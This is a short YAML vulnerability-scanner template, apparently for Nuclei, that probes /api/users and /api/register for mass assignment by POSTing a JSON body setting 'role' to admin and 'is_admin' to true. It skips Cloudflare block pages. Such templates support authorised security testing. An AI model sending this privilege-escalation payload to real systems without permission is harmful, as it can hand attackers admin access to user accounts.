id: K70n0s510-mass-assignment
info:
  name: JSON Mass Assignment
  author: K70n0s510
  severity: high
  tags: a04,logic,api
http:
  - method: POST
    path: ["{{BaseURL}}/api/users", "{{BaseURL}}/api/register"]
    headers: {Content-Type: "application/json"}
    body: '{"role":"admin","is_admin":true}'
    matchers-condition: and
    matchers:
      - type: word
        words: ["\"role\":\"admin\"", "\"is_admin\":true"]
      # CLOUDFLARE FIX
      - type: word
        words: ["Cloudflare", "error code: 1020", "Access denied"]
        negative: true
